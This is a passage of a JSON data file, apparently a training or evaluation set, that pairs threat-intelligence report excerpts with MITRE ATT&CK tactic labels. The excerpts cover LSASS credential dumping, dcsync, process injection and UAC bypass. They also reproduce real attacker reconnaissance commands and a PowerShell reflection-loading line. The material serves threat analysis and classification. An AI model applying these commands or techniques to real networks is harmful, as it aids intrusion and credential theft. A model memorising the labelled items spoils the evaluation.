        "input": "Described attack activity: Credentials were extracted from LSASS (Local Security Authority Subsystem), a technique commonly seen during similar intrusions. On day one, through hands-on activity, the threat actor executed cslite.exe (a CSharp Streamer file dropped on the Desktop of a compromised user), which was used to access the LSASS process. Process access can be seen using Sysmon event ID 10, as displayed below.\nMicrosoftdocumented the granted accesses, which are the following:\n0x1010: PROCESS_QUERY_LIMITED_INFORMATION (0x1000) and PROCESS_VM_READ (0x0010) \n0x1FFFFF: PROCESS_ALL_ACCESS\nAnother data point to look for is the UNKNOWN string in the CallTrace, which indicates Sysmon was not able to resolve the address of code from where the OpenProcessfunction was called, potential indication of a DLL in memory.\nWe also were able to collect memory and scan it with various YARA rules, confirming the use of a Mimikatz implementation with several rule hits for the cslite.exe memory space and file:\nIn another instance, we saw LSASS being accessed by WerFault.exe, with PROCESS_ALL_ACCESS granted. This should happen rarely in a production environment, and once again, the CallTrace can also help as CallTrace with ntdll.dll, dbghelp.dll or dbgcore.dll (source 1,source 2) should be monitored.\nFinally, on the second day, we can see yet another access to LSASS, this time from rundll32.exe, once again using access 0x1010 and with UNKNOWN in the CallTrace. This time, rundll32.exe was spawned by PowerShell, which was tasked to download and execute a Cobalt Strike beacon.\nAround 40 minutes after the LSASS dump by the \"cslite.exe\" executable, we observed a traffic spike from the beachhead host to a domain controller. Reviewing this network traffic using the Suricata rules fromDidier Stevens, we discovered potential Mimikatz dcsync activity between the hosts.\nAt the same time we found Event ID 4662 logs on the domain controller, confirming a sync operation requested by the \"Administrator\" account:\nSpecifically, we were looking for theDomain-DNS Class(object) - Schema GUID: 19195a5b-6da011d0-afd300c04fd930c9andDS-Replication-Get-Changes-All - Schema GUID: 1131f6ad-9c0711d1-f79f-00c04fc2dcd2as explained in thisSpectreOps post, to detect this dcsync activity. Using these two points of evidence, we can say with good confidence that the threat actor performed a dcsync operation.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: LAPSUS\\$'s action on objectives appears to focus on data exfiltration of sensitive information as well as destruction or disruption. In one particular incident the threat actor is observed to utilise the free file drop service \"filetransfer[.]io\". ",
        "output": "exfiltration",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As reportedearlierthis year, QBot is known for using process hollowing. In this case, the 32-bit version of explorer.exe (indicated by the use of C:\\Windows\\SysWOW64) was started in a suspended state, which was then used as a target for injection.\nInspecting memory dumped from the host, the injected processes were easy to discover using Volatility and the malfind module. Looking for output that included explorer.exe and contains the VAD tag PAGE_EXECUTE_READWRITE and MZ headers in the memory space, common attributes observed for process injection in memory.\nThe injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 11672 belonging to QBot, injected a DLL into PID 3592, which we discovered was part of Cobalt Strike C2 communication\nUsing the injected process id's, and process names, we can then match that to the network connections observed using the volatility netscan module, discovering both the injected Qbot (PID 3992) and Cobalt strike (PID 5620) explorer processes. (The data below comes from a different host than the prior log.)\nVarious folders were added as an exclusion for Windows Defender, commonly used by QBot, as a 'drop zone' for both execution and persistence.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: At Victim F, the operators also used Impacket to move laterally. They gathered information on other local machines and installed implants.\nTable 3 shows that the operators first did some manual reconnaissance usingquser.exe,wmic.exe, andipconfig.exe. Then they tried to get credentials and other secrets bydumpingthe local security authority subsystem service (LSASS) process (PID 944). The PID of the process was obtained viatasklist /svcand the dump was performed usingcomsvcs.dll, which is a known living-off-the-land binary (LOLBIN). Note that it is likely that the attackers executedquser.exeto see whether other users or admins were also logged in, meaning privileged accesses were present in LSASS. According toMicrosoft documentation, to use this command the attacker must have Full Control permission or special access permission.\nThey also saved the registry hivessam.hiveandsystem.hive, which can both contain secrets or credentials.\nFinally, they tried to dump the LSASS process again, using aforloop iterating over the output fromtasklist.exe. We have seen this same code used on other machines, so it is a good idea to block or at least alert on it.\nTable 3. Commands executed via Impacket on a machine at Victim F",
        "output": "lateral movement",
        "source": "Weblive"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon Hancitor launching on the system, it process injected into multiple instances of svchost.exe and rundll32.exe. Memory segments can be seen allocated with Execute, Read, and Write permissions, indicating that executable code is stored.\nAnomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.\nMoreover, the Cobalt Strike DLL stager was executed with a specific command line parameter which is used as a sandbox evasion feature. In this case it is the number 11985756.\nLastly, a PowerShell loader named agent1.ps1 used heavy obfuscation to conceal the execution flow and hide the final shellcode. After many iterations, the script would deobfuscate and run-in memory. The shellcode is responsible for loading a PE file into memory and calling out to 64.235.39[.]32 for further instructions.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: SMB was used to transfer the Ryuk executables. Then, RDP connections were made from the first compromised DC, and then, ransomware executed throughout the environment, starting with the Backup servers. On the backup server, prior to execution, the threat actors pulled up thewbadminmsc console.\nCommands ran prior to ransom execution:\nThe threat actors asked for more than $6 million but were willing to negotiate.\nEnjoy our report? Please consider donating $1 or more to the project usingPatreon. Thank you for your support!\nWe also have PCAPs, files, memory images, Kape and Redline packages availablehere.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Zoom installer was created usingInno Setup, a free installer for Windows programs, and served as the delivery mechanism for a multi-stage malware deployment and execution chain.\nThe trojanized installer was a downloader, more publicly known as \"d3f@ckloader\", and is built upon the Pascal Scripting language. String analysis of the compiled code revealed references to various zip/cmd files, executables and URLs. The embedded URLs pointed to various platforms, including OneDrive, Telegram, and Steam.\nUpon execution, the batch script 21.cmd was launched from the C:\\Program Files\\Windows NT directory. The script was no longer available on the beachhead system at the time of analysis however based on similar d3f@ckloader samples, we assess it was configured to set the 'hidden' attribute to all folders and files in the script's running directory and add the root folder C: to Windows Defender's exclusion list.\nThis data was observed insandbox executionsof the sample:\nThe malware then established a connection to a Steam community profile page to obtain the IP address hosting the second-stage malware.\nThe Inno Download Plugin (idp.dll), a component of Inno Setup, was used to fetch two ZIP files from the remote IP address. The User-Agent associated with these web requests is very distinctive, making it a useful detection characteristic commonly identified byNIDS(network-based intrusion detection system) signatures.\nFollowing this, the batch script, named 4554.cmd was executed. It was configured to extract the contents of both zip files in the C:\\Program Files\\Windows NT directory and run two executables that were stored within those archives.\nThe first archive contained the executable 1522.exe and represented a benign Zoom installer, likely employed to mask the malicious activity and maintain user trust. In the second archive resided a collection of files, including a signed executable 152.exe, various DLL files that contain HijackLoader (aka IDAT loader) and its encrypted payload file, artillery.mdb.\nThe execution flow of 152.exe parallels a previously reported instance, documented byRapid7, where a similar chain spawns an instance of cmd.exe and ultimately decrypts, loads and injects a SectopRAT payload into the MSBuild.exe process.\nThis injected MSBuild.exe process then reached out to pastebin to receive its C2 configuration.\nExecution graph:\nBrute Ratel\nOn the ninth day of the intrusion we observed the SectopRAT process spawn a new command shell and execute the DLL 2905.dll using regsvr32.exe .\nYARA rule-based memory scanning revealed binary patterns within the loaded process that are consistent with the Brute Ratel C4 framework.\nOne minute before the 2905.dll file was dropped to disk, another DLL, 3004.dll, was also dropped. This DLL was also a Brute Ratel Badger but had a different C2 configuration and was never executed during the intrusion. It is unclear if this was an oversight by the threat actor or was dropped by accident.\nCobalt Strike\nThe same DLL was observed facilitating the execution of a Cobalt Strike beacon, run32.exe , that resided in Windows' temp directory.\nMemory scans confirmed this executable as a Cobalt Strike beacon with several various YARA rule hits.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Mimikatz was executed on the beachhead host just 20 minutes after initial access was performed. This was visible in the memory on the host as Anydesk wrote the file to disk.\nSysmon event code 1 showed the execution of Mimikatz:\nSysmon event code 10 showed that Mimikatz accessed the LSASS process, and we can also see subsequent GrantedAccess for Mimikatz 0x1010 , which translates to: PROCESS_QUERY_LIMITED_INFORMATION (0x1000) and PROCESS_VM_READ (0x0010) .\nSysmon event code 11 shows that the Mimikatz process creates a file called passwords.txt:\nFinally, the threat actor reviewed the captured passwords by opening the newly generated password file in Notepad, as documented in Sysmon event code 1:\nThe threat actor also ran the script Veeam-Get-Creds-New.ps1 on the backup server:\nPowershell scripts are logged under event code 4104 ifpowershell script block logging is enabled:\nThe script looks to be from thesadshade/veam-credsGitHub repository, and the script tries to get credentials from the Veeam credential manager.\nThe threat actor also discovered a txt file on a file share server that contained IT-related cleartext passwords. Included were the credentials for a Domain Admin account. Through their RDP session, they proceeded with opening the the txt file using Notepad. Illustrated below via the process execution evidence:",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial execution occurred via theBazarloader DLLbeing executed by rundll32.\nAbout an hour after the initial execution on the beachhead, a Cobalt Strike beacon was executed also with rundll32.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors extracted credentials from LSASS during the intrusion. The process started with a Cobalt Strike beacon process starting a new rundll32.exe child process, with no command line arguments, as SYSTEM. It is unusual for rundll32 to be executed without any command line, but it is a common pattern for Cobalt Strike beacon injection target processes. This makes a useful detection pattern. The rundll32 process also created a named pipe (Sysmon Event ID 17) with a pipe name that started with \"\\postex_\" which is another well-known Cobalt Strike beacon artifact that can be detected. The newly spawned rundll32 process accessed the lsass.exe process, and then created a remote thread in lsass.exe. These events were recorded by Sysmon event IDs 8 and 10.\nEvent ID 10 had the following relevant fields, which may be useful for threat hunting or incident response:\nEvent ID 8 had the following relevant fields:\nAfter accessing and injecting into LSASS, the threat actors began using another domain administrator account indicating successful credential access.\nDuring file share browsing activity by the threat actors, we observed them finding and opening a document related to passwords for the environment.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Domain fronting is a technique used by attackers to circumvent protection based on DNS filtering. In this campaign, a malicious Cobalt Strike beacon is configured to take advantage of a mechanism used by Cloudflare and other content distribution networks to instruct the proxy about the host to be used for serving the content. \nWhen the beacon is launched, it will submit a DNS request for a legitimate high-reputation domain hosted behind Cloudflare infrastructure and modify the subsequent HTTPs requests header to instruct the CDN to direct the traffic to an attacker-controlled host. \nDefenders should monitor their network traffic even to high reputation domains in order to identify the potential domain fronting attacks with Cobalt Strike and other offensive tools. XDR tools should be deployed to endpoints in order to detect behavior of Cobalt Strike loaders and Meterpreter stagers as they are frequently used by a wide range of actors. \nCoverage Ways our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here.   \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such asThreat Defense Virtual,Adaptive Security Appliance andMeraki MX can detect malicious activity associated with this threat. Cisco Secure Malware Analytics (formerly Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.   \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nThe following ClamAV signatures have been released to detect this threat: Win.Backdoor.CobaltStrike-9909816-0 \nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase onSnort.org. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor created a process memory dump from LSASS.exe. In this case they created a \"minidump\" using the LOLBINcomsvcs.dll. This was dropped to disk as ssasl.pmd (lsass.dmp reversed) and then zipped before exfiltration.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Timeframe: Approximately 14 months before encryption and wiper attacks. \nDetails: Initial access was obtained via exploitation of an Internet-facing Microsoft SharePoint, exploiting CVE-2019- 0604. ",
        "output": "initial access",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1053 Scheduled Task/Job| Scheduled task to execute payload every 60 minutes \nPrivilege escalation \n002/003 Valid Accounts: Local and Domains Accounts| Credentials stolen for privilege escalation using Mimikatz \nDefense evasion \nThreat actor leverages coin miner techniques to stay under the radar  here's how to spot them | Microsoft Security Blog \nT1070 Indicator Removal on Host| Stopping of malicious tasks after data   \nexfiltration or payload retrieval, deleting dropped malware from the disk, and   \nclearing of PowerShell event logs   \n002 Hijack Execution Flow: DLL Sideloading| Using winword.exe, dbgview.exe,   \nmsmpeng.exe to load malicious DLLs \nCredential access \nT1003Credential Dumping | Use of Mimikatz to dump credentials ",
        "output": "persistence",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: There were attempts to exploit Active Directory vulnerabilitiesCVE-2021-42278 and CVE-2021-42287in order to create privileged accounts. This attempt failed, however, there were indicators through DNS requests enumerating accounts for the existence of SAMTHEADMIN-XX (XX being a random number). Thequery status 9003indicates that this does not exist. The injected process dllhost.exe requesting SAMTHEADMIN-92 and SAMTHEADMIN-20 accounts:We believe the operator used the publicly available script 'sam_the_admin' or a variant based on it. Part of the script generates a new computer name account in the form SAMTHEADMIN- followed by a random value between 0 to 100, as indicated below.The exploitation involves invoking lookups to ensure that the new accounts were successful, explaining why failed DNS requests were observed.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The first discovery stage includes TTPs that we have seen in multiple cases, such as trusts discovery, domain admin group discovery, network discovery and process enumeration.\nAdFind\nAdFind.exe was renamed to af.exe and was used by threat actors in order to enumerate AD users, computers, OU, trusts, subnets and groups.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: System Network Configuration Discovery   \nRemote System Discovery   \nAccount Discovery   \nPermission Groups Discovery \nLateral movement \nWindows Admin Shares   \nPass the Hash   \nRemote File Copy   \nWindows Management Instrumentation   \nNew Service   \nScheduled Task \nCollection \nData From Local System Data Staged Email Collection \nCommand and control \nRemote File Copy Connection Proxy ",
        "output": "discovery",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In this case, the Ursnif malware was delivered using a very familiar technique of being contained within an ISO file.\nThe DFIR Report has previously reported on several incidents that involved the tactic of delivering malicious flies using ISO files:\nQuantum Ransomware \nBumbleBee Roasts Its Way to Domain Admin \nBumbleBee: Round Two \nDiavol Ransomware\nAs we have previously highlighted, the Event LogMicrosoft-Windows-VHDMP-Operational.evtxcontains high confidence evidence when users mount ISO files. We recommend looking for these events (especially Event ID's 1, 12 & 25) in your environment and checking for anomalies.\nIn this case, the user had saved the file3488164.isoto the their downloads folder and mounted it.\nOnce mounted, the new drive contained a LNK file6570872.lnkand hidden folder \"me\".\nIf we parse this LNK file with LECmd (by Eric Zimmerman), it highlights the execution path and the icon it appears as:\nThe contents of hidden folder \"me\", included several files and folders that were used for the execution of Ursnif. Of interest, the folder included a legitimate copy ofrundll32.exe(renamed to123.com).\nSummary of the files found in3488164.iso(a detailed break down of these can be found inExecution):",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Mandiant has observed attackers using the ARD screen sharing function to move laterally between systems. If remote desktop was not enabled on a target system, Mandiant observed attackers connecting to systems via SSH and executing a kickstart command to enable remote desktop management. This allowed remote desktop access to the target systems. The following is an example from the macOS Unified Log showing a kickstart command used by an attacker to enable remote desktop access for all users with all privileges: \nDuring an investigation, you can use a few different artifacts to trace this activity. Execution of the   \nkickstart command modifies the contents of the configuration file /Library/Application   \nSupport/Apple/Remote   \nDesktop/RemoteManagement.launchd to contain the string \"enabled\". SSH login activity can be found in the Apple System Logs or Audit Logs. Execution of the kickstart command can be found in the   \nUnified Logs, as seen in Figure 1. \nAn ARD administrator has a substantial amount of power available to them, similar to compromising an administrator account in a Windows environment. By compromising an account that has access to ARD administrator system, an attacker can perform any of the following actions: \nRemotely control VNC-enabled machines,   \nincluding in \"Curtain Mode\" which hides the   \nremote actions from the local workstation's   \nscreen   \nTransfer files   \nRemotely shut down or restart multiple   \nmachines simultaneously \nSchedule tasks \nExecute AppleScript and UNIX shell scripts \nApple's ARD web page and the ARD help page contain more details about ARD's capabilities. ",
        "output": "lateral movement",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: There is a growing trend to use both clean and malicious components in malware, and Byakugan is no exception. This approach increases the amount of noise generated during analysis, making accurate detections more difficult. However, the downloaded files provided critical details about how Byakugan works, which helped us analyze the malicious modules. FortiGuard Labs will continue to monitor this malware and provide updates on this variant as they become available.",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Remote Services: SMB/Windows Admin Shares\nNetExec:NetExec is a post-exploitation tool that evolved from CrackMapExec. It has multiple features and functionalities for remote command execution, network enumeration and privilege escalation.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Following system infection, if the user account permissions allow it, PowerTaskel performs several tasks to elevate its privileges to the System level. To achieve this, PowerTaskel utilizes the PsExec utility, which is part of the Sysinternals suite. The PsExec utility is dropped into the current directory where PowerTaskel is located and is used to execute mshta.exe with system privileges, passing a URL as an argument. \nThe images below depict two tasks that PowerTaskel executes with its C2 server. The first task checks for the presence of the file \"ntuser.exe\" in the %ProgramData% directory, and if it is not found, downloads it from the C2 server. The second task runs mshta.exe via ntuser.exe, which is actually a renamed PsExec utility. \nGetting \"ntuser.exe\" ",
        "output": "lateral movement",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Every day, more industrial control systems (ICS) become vulnerable to cyber attacks. As these massive, critical machines become more interconnected to networks, it increases the ways in which attackers could disrupt their operations and makes it tougher for those who protect organizations' networks to cover all possible attack vectors. To demonstrate how these ICSs interact with a network, we are releasing a model of a 3-D printed oil pumpjack connected to a simulated programmable logic controller (PLC) supporting two industrial protocols. Throughout the year, Talos will have this model at several workshops where attendees can try it out for themselves. For convenience, we are also providing the blueprints and code to even test this out for yourself at home. \nWe are releasing the 3-D printed model of the pumpjack, the Arduino source code (including the Modbus over TCP and the EtherNet/IP protocols), as well as the code for the human-machine interface (HMI) to control the pump over a network. \nTo show how serious of a problem it could be if an attacker were to gain control of this device in the real world, here's a GIF that shows how the pump reacts when the motor speed is increased beyond its natural pace. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Threat actors usually use this stage to obtain more information about the infected computer and its local network. At this point, cybercriminals most often leverage the tools built into the operating system. \nAccount Discovery  T1087 \nThe Net utility is used to display information about the computer's network configuration. The utility helped the adversaries gather information about domain group membership and collect lists of administrators. \nnet user /domain > 1.txt net user net localgroup administrators net accounts /domain net group \"Domain Admins\" \nSystem Information Discovery  T1082 \nAt this stage, the attackers gathered information about the system basic configuration (e.g., the Windows version or system architecture). \necho %PROCESSOR_ARCHITECTURE% systeminfo whoami net config Workstation \nPermission Groups Discovery  T1069 \nThe adversary obtained a list of objects from Windows groups as follows: \nnet group \"Domain Admins\" /domain net group \"domain Controllers\" net group \"Exchange Servers\" net group \"Schema Admins\" net group \"Protected Users\" net group \"Enterprise Admins\" net group \"Enterprise Read-only Domain Controllers\" net group \"Exchange Domain Servers\" \nThe hackers made queries to the registry to obtain information about the currently used RDP ports or network configurations. \nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server\\WinStations\\RDPTcp /v PortNumber\" reg query   \n\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" reg query \"HKEY_LOCAL_MACHINE   \n\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\Interfaces\\{1f777394-0b42-11e3- 80ad-806e6f6e6963}\" \nDomain Trust Discovery  T1482 \ndsquery site \nSystem Time Discovery  T1124 net time /domain \nProcess Discovery  T1057 \nIn some cases, the threat actors conducted reconnaissance on remote devices to establish whether files with certain names were running on them. The attackers had downloaded these files to remote devices earlier. \ntasklist /pid 1428 /f tasklist /s 172.16.2.132 /u test\\administrator /p {redacted} tasklist | findstr update_x64.exe \nNetwork Service Scanning  T1046 \nAt this stage, the threat actors also used a publicly available tool called cping to identify local computers vulnerable to SMB attacks. \nC:\\PerfLogs\\cping40.exe scan smbvul 10.0.0.1 10.0.10.1 > 10.txt cping40.exe scan smbvul 192.168.20.1 192.168.29.1 > 30.txt \nNetwork Share Discovery  T1135 \nThe threat actors attempted to detect available network drives: \nnet share net view /DOMAIN \nSystem Network Configuration Discovery  T1016 \nOne of the ways in which the threat actor obtained information about the available network configuration was to access the registry key directly: \nreg query \"HKEY_LOCAL_MACHINE   \n\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\Interfaces\\{1f777394-0b42-11e3-   \n80ad-806e6f6e6963}\" \nSystem Network Connections Discovery  T1049 \nTo identify network connections, the hackers used a built-in utility called netstat: \nnetstat -ano netstat -r netstat -an netstat -aon|findstr \"8080\" netstat -ano | findstr dns.exe \nRemote System Discovery  T1018 \nThe hackers used the Ping command with a single echo request to identify other devices on the local network. In order to simplify their tasks, they used a FOR loop. They also used the SETSPN utility to identify on which devices in the domain a particular service was running. This helped the attackers identify which devices were running the following services: IIS, SQL and MSSQL. \nIt is important to note that in one of the cases we analyzed, the threat actors used the \"payload\" string instead of the necessary one, which indicates that the command was copied from another source. \nping -n 1 PIST-FILE-SRV for /l %i in (1,1,255) do @ping 172.67.204.%i -w 1 -n 1|find /i \"ttl=\" setspn -T [target_company_name4] -Q \\*/\\* | payload setspn -T [target_company_name6] -Q \\*/\\* | findstr IIS setspn -T [target_company_name5] -Q \\*/\\* | findstr SQL setspn -T [target_company_name6] -Q \\*/\\* | findstr MSSQL ",
        "output": "discovery",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Early observed attacks by DEV-0537 targeted cryptocurrency accounts resulting in compromise and theft of wallets and funds. As they expanded their attacks, the actors began targeting telecommunication, higher education, and government organizations in South America. More recent campaigns have expanded to include organizations globally spanning a variety of sectors. Based on observed activity, this group understands the interconnected nature of identities and trust relationships in modern technology ecosystems and targets telecommunications, technology, IT services and support companiesto leverage their access from one organization to access the partner or supplier organizations. They have also been observed targeting government entities, manufacturing, higher education, energy, retailers, and healthcare. \nMicrosoft will continue to monitor DEV-0537 activity and implement protections for our customers. The current detections and advanced detections in place across our security products are detailed in the following sections. ",
        "output": "impact",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After being dropped by the dropper, the installer is executed. The installer, some of which are padded with null bytes (0x00) to inflate their size, is responsible for deploying an embedded executable to disk and then executing the backdoor itself. The installer initially drops the payload as $\"\\mathsf{m.d^{\\prime\\prime}}$ in the covert store (\"C:\\ProgramData\\Microsoft Installer{EA2C6B24-C590-457B-BAC8- 4A0F9B13B5B8}\\Force\"). Some of the installers forge the dropped file's CreationTime, LastAccessTime, and LastWrite time from C:\\Windows\\System32\\smss.exe \nThe installer then executes the \"Alloc\" export which checks whether the device is currently   \nrunning DeepFreeze by Faronics, although this is not applicable for the samples analysed by Mandiant. If the process name contains \"creensaver.\", the   \nbackdoor will write the image to %SYSTEM32%\\Slui and then execute a task named   \n\"\\\\Microsoft\\\\Windows\\\\License   \nManager\\\\LicenseExchange\\\". Alloc ultimately calls the Control_Provider export, which will initiate the backdoor. \nThe main functionality is provided in the next export called by the installer, \"RatingSetupUI\". This export is responsible for all the command-and-control (C&C) interactions and backdoor capabilities. \nThe last two exports are related to the update process. \"Control_Provider\" manages the update process whereas \"Telephon\" executes the \"Control_Provider\" function. \nIf the backdoor is not running as an administrator, the backdoor may use embedded payloads to escalate privileges. A mutex named \"rerunadmn\" is used internally by the backdoor and the two RC4 encrypted payloads are extracted. The first payload is a .NET loader, which loads the second payload and calls the type \"vjp5ZPP9AidVjXxofy\" and method \"s7tajdxvX\".  The loader \n(MD5: 779940f675ff4ab4e8cab7a1b7cf5d3c) will first enumerate the loaded .NET modules looking for the above class and methods. If they exist, it will execute that module. If the module is not loaded, the assembly is loaded and then executed in memory. The backdoor will then pass through the string $\\mathbf{\\mu}^{\\prime\\prime}\\mathsf{A}\\mathsf{D}^{\\prime\\prime}$ if the payload is already executing as Administrator or the path to a temporary file on disk, directly to the loaded .net module. This temporary file is created by writing the content of the Software\\AppDataLoad\\GLX\\aex and writing the content to the Windows %TEMP% directory with the name APPX.<random_values>.tmp. This file is a copy of the backdoor itself. If the payload can't resolve the export CP from the loader, it reverts to invoking PowerShell with the following command, passing in the path to the second payload, the type and method and either AD or the path to the second module: \n[Reflection.Assembly]::LoadFile(\\\"%s\\\")\\n\\$i=\\\"\\\"\\n\\$r =[%s]::%s(\\\"%s\\\",[ref] \\$i)\\necho \\$r,\\$i\\n \nExecution will then proceed within the second payload (MD5: 3633b3d69060a5882656b69f81655f0a), responsible for ensuring that the payload is running with administrator privileges. This payload is obfuscated by reactor and contains encrypted strings used throughout the execution. Upon execution, the payload will create the mutex \"rerunadmn\" and \"subttoadmn\". The module utilises the following techniques to execute the payload as administrator: \n1. Makes use of the Windows \"SilentCleanup\" scheduled task. This task executes the executable running in %windir%\\system32\\cleanmgr.exe, and the payload uses the Windows Registry Environment key to change the %windir% variable to point to c:\\Windows. Next, the payload creates a new System32 folder and copies an embedded payload called cleanmgr.exe (MD5: 779940f675ff4ab4e8cab7a1b7cf5d3c) into this folder , alongside a .cfg file with the content \"slc\". Following this, the task is executed. This technique is similar to a technique within Metasploit called bypassuac_silentcleanup. \n2. Makes use of the windows CMSTP.exe binary to install a malicious Microsoft Connection Manager Profile on the device. This technique drops cln.vbs to the c:\\windows\\temp folder (MD5: 7a77c2930f0457ed2dd622e9739c7d3d), then creates a .ini file for the Ethernet service. Within this ini file, the payload contains two RunPreSetupCommandsSection values, one for the payload itself, and the second for executing the cln.vbs script. The legitimate cmstp.exe will then be executed on the host which executes the backdoor and then the clean-up script. This technique is identical to a technique made public in 2017 by Oddvar Moe. \nCHIMNEYSWEEP has the following major functionality: \nScreenshot collection: Takes screenshots of the compromised device on a timer and stores to disk or can be tasked to take a screenshot and upload.   \nFile collection and listing: Monitors for new removable drives and performs directory listing on demand, enumerates directories for files that match a set list, and can be tasked to upload a file to the command-and-control server.   \nKeylogging: Monitors the content of the clipboard and performs key logging to disk.   \nReverse shell: Contains a reverse shell which can be utilised by the attacker. ",
        "output": "execution",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
